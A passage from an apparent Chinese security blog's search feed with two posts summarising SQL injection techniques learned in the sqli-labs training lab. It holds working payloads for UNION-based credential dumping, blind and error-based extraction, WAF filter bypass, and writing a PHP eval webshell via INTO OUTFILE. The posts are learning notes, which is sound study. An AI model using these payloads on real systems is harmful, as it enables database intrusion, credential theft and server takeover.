语句中使用的字符串中的特殊字符。受影响的字符有<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>;</p><p>  <code>intval(mixed $var,int $base = xx)</code>函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 整数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>  <code>$timestamp = time() + 3600; date($format, $timestamp)</code>time()函数返回当前时间的 Unix 时间戳，并格式化为日期。date()函数对时间进行格式化，format为格式，timestamp为规定时间戳。</p><p>  <code>base64_decode($cookee);</code>函数对参数进行base64解密。</p><p>  <code>setcookie(name,value,expire,path,domain,secure)</code>函数向客户端发送一个 HTTP cookie。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。</p><p>  <code>header(string,replace,http_response_code)</code>函数向客户端发送原始的 HTTP 报头。</p><p>  <code>session_start();</code>函数会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。 </p><p>  <code>mysql_escape_string ( string unescaped_string )</code>函数将 unescaped_string 转义，但并不转义 % 和 _。</p><p>  <code>alert()</code> 函数用于显示带有一条指定消息和一个 OK 按钮的警告框。</p><p>  <code>mysql_affected_rows()</code>函数返回前一次 MySQL 操作所影响的记录行数。</p><p>  <code>blacklist($id)</code>为自定义函数，主要用到<code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>函数，该函数执行一个正则表达式的搜索和替换，如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。多字符过滤。</p><h6 id="MYSQL五类报错注入函数："><a href="#MYSQL五类报错注入函数：" class="headerlink" title="MYSQL五类报错注入函数："></a>MYSQL五类报错注入函数：</h6><ol><li><pre><code class="php+HTML">1. floor()：取整函数，打开MySQL命令框输入命令查看报错信息。select count(*) from infomation_schema.tables group by concat((select database()),floor(rand(0)*2);2. extractvalue()：接收两个参数，第一个XML文档，第二个xpath语句。xpath语句格式错误返回数据。select extractvalue(1,concat(0x7e,(select database()),0x7e));3. updatexml()：查询出所有库以及库中所有表的信息。select updatexml(1,concat(0x7e,(select database()),0x7e,1);4. exp()：返回e(自然对数的底)指数X的幂值。select EXP(~(SELECT * from(select database())a));5. 六个同类空间索引函数：   - GeometryCollection()：零个或更多个 geometry 或 geography 实例的集合。   select GeometryCollection((select * from (select * from(select user())a)b));   - polygon()：存储为一系列点的二维表面，这些点定义一个外部边界环和零个或多个内部环。   select polygon((select * from(select * from(select user())a)b));   - multipoint()：零个点或更多个点的集合。   select multipoint((select * from(select * from(select user())a)b));   - multilinestring()：零个或更多 geometry 或 geography LineString 实例的集合。   select multilinestring((select * from(select * from(select user())a)b));   - linestring()：一个一维对象，表示一系列点和连接这些点的线段。   select LINESTRING((select * from(select * from(select user())a)b));   - multipolygon()：零个或更多个 Polygon 实例的集合。   select multipolygon((select * from(select * from(select user())a)b));</code></pre></li></ol><hr><p>  语法不是一成不变的，有时候灵活贯通才是最重要的，接下来记录常见SQL注入姿势：</p><ol><li><h6 id="普通注入："><a href="#普通注入：" class="headerlink" title="普通注入："></a>普通注入：</h6><p>这一类注入是最基础且最核心的注入，过程也已经公式化了：</p><p>1）判断注入点：<code>&#39;,&quot;,无，),&#39;),&quot;)</code>等，接<code>or 1=1</code>和<code>or 1=2</code>，根据返回判断，恒等式成立表示成功，矛盾等式成立表示错误，最后面用注释符。</p><p>2）判断字段个数：<code>order by i #</code>，i 为自然数，列存在则返回正常界面，不存在返回错误界面。例，当列的个数为4时，i从1到4都会返回正常界面，i 为5及5之后的时候，会返回错误信息，由此可判断，数据库中当前正在使用的表有4 个字段（列）。这里假设有4个字段。</p><p>3）判断显位：<code>union select 1,2,3,4 #</code>显位会将界面中值所在的字段显示出来。例，表中原本是显示“test”的地方现在显示2，说明“test”所在的字段会在界面中显示，而且是显示在2的位置。判断显位的主要目的是为了在构造查询语句的时候明白要把查询的值放在哪个字段。这里假设显位为2，3。</p><p>4）爆库名：<code>union select 1,schema_name,3,4 from information_schema.schemata limit 0,1 #</code>或<code>union select 1,group_concat(schema_name),3,4 from information_schema.schemata#</code>或<code>union select 1,database(),3,4 #</code>第一种是手工逐个爆出数据库名，通过修改limit后面的第一个参数，回显不同的数据库；第二种是利用group_concat()将数据库成组爆出，用逗号隔开；第三种是利用database()方法直接爆出当前正在使用的数据库名（只有一个）。这里假设库名为“security”。</p><p>5）爆表名：<code>union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;security&#39; limit 0,1#</code>或<code>union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() #</code>或<code>union select 1,user(),3,4 #</code>第一种是手工逐个爆出表名，通过修改limit后面的第一个参数，回显不同的表；第二种是利用group_concat()将表成组爆出，用逗号隔开；第三种是利用user()方法直接爆出当前正在使用的表名（只有一个）。这里假设表名为“users”。</p><p>6）爆字段名：<code>union select 1,column_name,3,4 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1 #</code>或<code>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=user() #</code>第一种是手工逐个爆出字段名，通过修改limit后面的第一个参数，回显不同的字段；第二种是利用group_concat()将字段成组爆出，用逗号隔开。这里假设字段名为id，username，password，is_admin。</p><p>7）爆元组值：<code>union select 1,username,password,4 from security.users limit 0,1 #</code>或<code>union select 1,group_concat(username),group_concat(password),4 from users#</code>第一种是手工逐个爆出元组值，通过修改limit后面的第一个参数，回显不同的元组值；第二种是利用group_concat()将元组值成组爆出，用逗号隔开。元组值就是最后的目标。</p><p>==下面的(select)表示普通注入4)到7)。。。。。==</p></li><li><h6 id="双注入："><a href="#双注入：" class="headerlink" title="双注入："></a>双注入：</h6><p>双注入是在普通注入的基础上再加一成注入条件，主要是利用mysql虚拟表报错。注入点，字段数，和显位的判断与普通注入相似。这里假设有3个字段，显位为2，3。</p><p>爆内容格式：<code>union select 1,count(*),concat((select),floor(rand()*2)) as a from information_schema.tables group by a #</code>或<code>union select 1,count(*),count(*) from information_schema.tables group by concat((select),floor(rand()*2)) #</code>，这里的select语句不能用到group_concat()，会和前面的concat()冲突。</p></li><li><h6 id="SQL盲注："><a href="#SQL盲注：" class="headerlink" title="SQL盲注："></a>SQL盲注：</h6><p>1）布尔盲注：</p><ul><li><p>判断长度：<code>and length(select)&gt;n #</code>，n为自然数，也就是长度，回显出现明显不一样的时候。</p><p>length($str)方法返回字符串长度。</p></li><li><p>判断内容：<code>and ascii(substr((select),i,1))&gt;n #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，也可以写成<code>and substr((select),1,j)=&#39;$str&#39;#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p><p>sacii($str)方法将字符串转换为ascii码。</p><p>substr($str,i,j)方法从str中的第i位开始提取j个字符。</p></li></ul><p>2）时间盲注：</p><ul><li><p>判断内容：<code>and if(ascii(substr((select),i,1))&gt;n,1,sleep(3)) #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，同理这里也可以写成<code>and if(substr((select),1,j)=&#39;$str&#39;,1,sleep(3))#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p><p>if(example, true,false)条件判断，当true!=0&amp;&amp;true!=NULL时返回true，否则返回false。</p><p>sleep(3)延迟输出，这里延迟时间3秒。</p></li></ul><p>3）报错盲注：</p><ul><li><p>直接语句注入，即双注入。</p></li><li><p>xpath函数注入：<code>and extractvalue(1,concat(0x7e,(select),0x73)) #</code>或<code>and updatexml(1,concat(0x7e,(select),0x7e),1) #</code>或<code>and EXP(~(SELECT * from(select )a)) #</code>或mysql六大空间图形索引函数。</p><p>extractvalue($xml-document,xml-path) :对XML文档进行查询的函数，第二个参数xml-path是xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容。</p><p>updatexml($xml-documet,xml-path,update-content)方法更新xml文档，利用原理同上。</p></li><li><p>重复性报错：<code>union select 1,2,3 from (select name_const((select),1),name_const((select),1))x #</code>(select)语句必须一样，x为别名。</p><p>name_const(name,value) 返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p></li></ul></li><li><p>文件导入导出：</p><ul><li><p><code>load_file()</code>:<code>union select 1,2,load_file(&#39;c:\\xxx\..\xxx.xxx&#39;)</code></p><p>load_file()：读取文件并返回文件内容为字符串，使用有<a href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/#more">前提</a>，参考文件导入导出。</p></li><li><p>目标文件不存在采用<code>SELECT...INTO OUTFILE</code>：<code>select &lt;?php @eval($_POST[&#39;sb&#39;])?&gt; into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>，该例子在c盘选定目录下新建xxx.php文件，并将一句话木马内容<code>&lt;?php @eval($_POST[&#39;sb&#39;])?&gt;</code>写入文件。</p></li><li><p>当然，这两个方法可以同时使用：<code>union select 1,2,(select load_file(&#39;C:\\xxx\..\xxx.php&#39;)) into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>。</p></li></ul></li><li><p>字符串过滤：</p><ul><li><p>注释符被过滤可以采用其他等价形式的注释符绕过，常用注释符：<code>//，，– ，=，/**/，#，–+，– -，;，%00，–a，&amp;&amp;，||，空格</code></p><p>例：空格被过滤：<code>union/**/select/**/1,2,3/**/from/**/usrs/**/where/**/1/**/#</code></p></li><li><p>常用字符串被过滤可以用大小写或双拼写绕过，常用字符串：<code>union，select，and，or，password，oder，where，like</code></p><p>例：union的大小写都被过滤：<code>uniUNIONon</code>代替</p></li></ul></li></ol><p>  目前能回想起来的大概就这么多，还有一些更深层次和零零碎碎的留至以后想起来的时候补充。如果有什么错误或不完善的地方，欢迎表哥表姐们指教。交友通道：1394850274</p><p>参考文献：</p><p><a href="https://www.cnblogs.com/Dleo/p/5493782.html">https://www.cnblogs.com/Dleo/p/5493782.html</a></p><p><a href="http://www.runoob.com/php/php-tutorial.html">http://www.runoob.com/php/php-tutorial.html</a></p><p><a href="https://www.cnblogs.com/daxueshan/p/6687521.html">https://www.cnblogs.com/daxueshan/p/6687521.html</a></p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI-LABS注入小结（Less-1～Less-28a）</title>
    <link href="/2021/05/09/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/"/>
    <url>/2021/05/09/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="SQLI-LABS注入小结"><a href="#SQLI-LABS注入小结" class="headerlink" title="SQLI-LABS注入小结"></a>SQLI-LABS注入小结</h1><h3 id="感悟："><a href="#感悟：" class="headerlink" title="感悟："></a>感悟：</h3><p>  这算是我第一次在这么大平台上发表博文，想想还是有点小激动的。说实在，搭建这个博客时我都没想好要在这上面发表什么，想了想还是记录一下自己学过还有即将要学的一些知识点吧，以免时间长了，啥也都忘了。这篇写<code>sqli-labs</code>主要也是在这里学到的东西太多，不给点分类的话，总是搞不清啥是啥！！！！！相对于一些捷径来说（像<code>sqlmap</code>这一类的工具直接爆破），我还是喜欢手工实验测试，这样会让我更容易理解漏洞出现的原因，方便后期自己去用<code>python</code>代码脚本实现攻击。当然，我也只是打到关卡28a，后面的关卡是一些新的知识，也没来得及去看去总结，之后有时间会继续补充。</p><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>  环境的配置安装，我这里就不多谈，网上的相关教程也挺多的。我用的是<code>MacBook</code>，<code>sqli-labs</code>配置<code>Linux</code>的<code>centos</code>镜像的PD虚拟机中，浏览器是<code>Firefox</code>（火狐），数据库<code>MYSQL</code>。</p><p>  在注入开始之前，首先要有SQL语言基础（增删改查），知道数据从<code>html---&gt;php—&gt;Mysql</code>的流动过程，以及一些常用的函数。</p><p>  下面贡献一波从第一关的第28a关中我自己的小结：</p><h5 id="1-基于错误的SQL注入："><a href="#1-基于错误的SQL注入：" class="headerlink" title="1.基于错误的SQL注入："></a>1.基于错误的SQL注入：</h5><p>  1）基于错误的SQL单注入：</p><p>  最为简单的的一种注入，由<code>mysql_error()</code>函数引起，<code>mysql_error()</code>函数的作用是返回上一个 MySQL 操作产生的文本错误信息。也就是说如果能闭合绕过注入点的话，就可以让mysql命令行执行我们提交的payload（这里简单提一下，sqli-labs后台处理SQL语句是将$sql变量放到mysql的命令行下执行，执行过程遵循SQL语言的可执行语句）。这种报错注入已经公式化了，适用于页面能回显数据库内部信息时，之后准备写一篇SQL绕过姿势，专门记录这个。之后的所有绕过姿势基本上都是在此基础上修饰，增加难度的。</p><p>  2）基于错误的SQL双注入：</p><p>  这个双注入指的就是双查询注入，顾名思义就是在select查询查询里面嵌套一个select子查询，这个有点像SQL语句用到的子查询。双查询注入适用界面上的不给你任何回显，但是PHP代码里还有<code>mysql_error()</code>函数时。这种注入也公式化了，hack们可以通过<code>floor(rand()*2)</code>，将结果控制在0和1直接，换句话说就是结果被控制在<code>true</code>和<code>false</code>之间，这样hack们就有50%的机会可以得到他们想要的内容的。这个双注入的就是利用主查询（外查询）控制输出方式，子查询（内查询）控制输出内容。</p><h5 id="2-SQL盲注："><a href="#2-SQL盲注：" class="headerlink" title="2.SQL盲注："></a>2.SQL盲注：</h5><p>  所谓盲注，就是后台的PHP代码完全不给你任何报错信息，也就是没有<code>mysql_error()</code>函数回显错误，在这种情况下进行爆破后台账户密码的注入。盲注一般都是利用一些有布尔类型返回值的函数进行逐字符判断，比较麻烦，所以一般都是跑脚本（一般是二分法脚本）。</p><p>  1）基于布尔的SQL盲注：</p><p>  布尔盲注就是对界面返回的信息不同进行判断，一般适用于界面只返回<code>true</code>和<code>false</code>时（也可以说成能看到的可注入页面只有两种，要么是注入失败的界面，注入成功就会返回另一个不同的界面，更通俗一点，就是源代码中注入失败的界面和注入成功的界面大部分是一样的，只有一两处不一样），hack们通过<code>length()</code>和<code>left()</code>函数或者<code>ascii()</code>和<code>substr()</code>函数特性判断。主要的语句写在这些函数里面，一点一点地字符串爆出来。</p><p>  2）基于时间的SQL盲注：</p><p>  时间盲注跟布尔盲注大同小异，只不过后台PHP的代码对界面进行了处理（可能是重定向，可能是屏蔽，等等），让注入失败和注入成功返回的界面一模一样（也可以是你所在的界面可注入，但界面显示的信息跟数据库返回的信息没有半点关系），但不管他们进行了哪个操作，返回的流量里都有数据库返回的信息，这个时候就可以用时间盲注。时间盲注利用<code>if()</code>函数的特性和<code>ascii()</code>，<code>substr()</code>，<code>sleep()</code>函数进行配合，让判断消息正确时和错误时，在mysql命令行执行的时间不一样，造成页面返回的时间不同，这样就可以判断。主要的语句写在这些函数里面，一点一点地字符串爆出来。</p><p>  3）基于错误的SQL盲注：</p><p>  这里报错盲注，也可以说是盲注公式化的基础，原理与报错双注入有些类似，都是通过hack们构造的payload将结果控制在可判断范围内除了上面提到过的利用<code>floor(rand()*2)</code>控制输出效果，hack们也许会利用<code>xpath</code>函数（<code>extractvalue()</code>，<code>updatexml()</code>）或者数据重复报错(<code>union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x--+</code>)来获取数据。ps:这个数据重复报错好像是有利用条件的，这个跟主键是有关的，因为主键是唯一的，不允许数据重复，但我试过几个虚拟注入环境，只能爆出版本。所以一搬都是利用<code>xpath</code>函数报错。</p><h5 id="3-基于数据类型的SQL注入："><a href="#3-基于数据类型的SQL注入：" class="headerlink" title="3.基于数据类型的SQL注入："></a>3.基于数据类型的SQL注入：</h5><p>  1）基于字符串的SQL注入：</p><p>  所谓基于字符串，从名字中也可以看出，URL传过去的参数被当作字符串类型处理，所以一般源码的type都是<code>text</code>这种类型，PHP中也是把这个当作字符串处理，最大的特点就是SQL语句中的变量会加单引号或者双引号这种明显用来区别字符与整型的标志。这是当前比较主流的一种方式，毕竟字符串便于理解，出错了也容易找到错误。这也给hack们在注入的时候提供更容易理解的漏洞。这种类型的注入比较 广泛，上面我做的小结基本是以这个为基本的。</p><p>  这里小提一句，mysql对引号的处理是引号必须成对出现的；引号之间的内容为空，mysql会忽略这对引号。</p><p>  2）基于数字（进制）的SQL注入：</p><p>  基于数字，那就是变量会做郑兴处理，一般是函数中对GET或者POST过来的值做整型判断，主要是用<code>is_number()</code>函数，看函数名都能猜出来这是判断参数是否为数字的函数。这种函数也比较好绕过，将写好的payload进行<code>ascii&lt;==&gt;进制转换</code>，再将数据传过去，因为虽然hack们传上去的可能都是16进制数或者科学记数法，但SQL是一串字符串，绕过<code>is_number()</code>之后，在这里会再次被强制转化为字符串的，这样他们的payload就能被读出来的。</p><h5 id="4-基于顺序的SQL注入："><a href="#4-基于顺序的SQL注入：" class="headerlink" title="4.基于顺序的SQL注入："></a>4.基于顺序的SQL注入：</h5><p>  1）直接注入（普通注入）：</p><p>  所谓普通注入就是直接在URL上提交我们的payload，无论是整型还是字符串型的payload，这个概念有一点大，基本上包括了sqli-labs中大部分的解题思路，简单说就是只进行一次注入就会返回hack们想要的结果，搜索的SQL语句直接提交给mysql数据库。</p><p>  2）间接注入（二次注入）：</p><p>  二次注入跟普通的注入差别就在二次注入是利用修改hack们第二次注册的账号密码，通过SQL语句触发并修改mysql数据库中已有的账号密码，从而拿到不同账号下的数据，也可以爆出数据库中的内容。一般这种注入用在应用程序中，用在那些有转义或过滤。相对于普通注入来说，二次注入不容易被一些工具扫描到，隐蔽性高出很多。</p><h5 id="5-基于注入位置的SQL注入："><a href="#5-基于注入位置的SQL注入：" class="headerlink" title="5.基于注入位置的SQL注入："></a>5.基于注入位置的SQL注入：</h5><p>  1）基于表单域的SQL注入（URL）：</p><p>  表单域注入是另一种分类概念，说的就是通过URL输入域将payload给<code>GET</code>或<code>POST</code>过去，然后爆出数据库的表单。上面也提过这个，毕竟现在的URL访问都是在URL输入域里面执行显示操作的。概念简单明了，没有什么特别的地方。</p><p>  2）基于cookie的SQL注入：</p><p>  基于cookie的注入，注入内容和方式和基于URL输入域的注入差不多，只不过是将payload放在cookie里面提交上去。这一类注入一般是在URL输入域中的<code>GET</code>和<code>POST</code>被过滤个遍，但是cookie没被过滤的情况下使用（这里还有一个前提，就是数据获取方式是<code>request（“xxx”）</code>，未指明具体方法）。</p><p>  百度百科:Cookie是由<a href="http://baike.baidu.com/view/7072073.htm">服务器端</a>生成，发送给<code>User-Agent</code>（一般是浏览器），浏览器会将Cookie的<code>key/value</code>保存到某个目录下的<a href="http://baike.baidu.com/view/40622.htm">文本文件</a>内，下次请求同一网站时就发送该Cookie给<a href="http://baike.baidu.com/view/899.htm">服务器</a>（前提是浏览器设置为启用cookie）。</p><p>  3）基于服务器header变量的SQL注入：</p><p>  基于header变量的注入没有那么多要求，主要是用在那些把header变量和其他数据存在同一个数据库下的网站。通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息。这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。这就造成hack们会利用header变量将SQL注入语句传上服务器，爆出他们想要的内容。</p><h5 id="6-文件导入导出操作："><a href="#6-文件导入导出操作：" class="headerlink" title="6.文件导入导出操作："></a>6.文件导入导出操作：</h5><p>  这个内容和下面的字符串过滤单独拿出来是因为这两个防护看起来很安全，但是绕过后造成的威胁却更大。文件导入导出主要是在那些文件权限太高的情况下会被利用，像<code>file_download()</code>这个函数，SQL语句内容返回到这个函数，就会造成这样做的漏洞。SQL注入成功后，利用<code>load_file()</code>函数可以直接爆出文件内容，但这个函数利用有前提：</p><ul><li>当前权限对该文件可读 ；</li><li>文件在该服务器上 ；</li><li>路径完整 ；</li><li>文件大小小于<code>max_allowed_packet</code>；</li><li>当前数据库用户有FILE权限 ；</li><li><code>secure_file_priv</code>的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</li></ul><p>  如果目标文件不存在，hack们还可以利用<code>SELECT...INTO OUTFILE</code>将他们的文件写入目录下，像一句话木马，或者payload之类的，都是可以的，不过这个也是有前提的：</p><ul><li>目标目录要有可写权限 </li><li>当前数据库用户要有FILE权限 </li><li>目标文件不能已存在 </li><li><code>secure_file_priv</code>的值为空 </li><li>路径完整</li></ul><h5 id="7-字符串过滤："><a href="#7-字符串过滤：" class="headerlink" title="7.字符串过滤："></a>7.字符串过滤：</h5><p>  为保证网站的安全性，后台的代码了会在将变量接收过来后就会直接进行一波waf过滤，将一些敏感字符直接给过滤掉，一般都是字符串替换<code>str_replace()</code>函数，或者正则表达式<code>preg_match()</code>被过滤的字符一般有<code>//，``，– ，=，/**/，#，–+，– -，;，%00，–a，&amp;&amp;，||，空格</code>，一些常用字符的大小写<code>union，select，and，or，password，oder，where，like</code>之类的</p><p>  我对sqli-labs/Less-28a关卡及之前关卡的理解分类大致就是如此，如果有什么不正确或不完整，表哥们有更好的理解和建议，可以和我一起探讨改正，这是我的联系方式(1394850274)：</p><img src="/2021/05/09/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/QQ.png" class="" title="QQ">]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
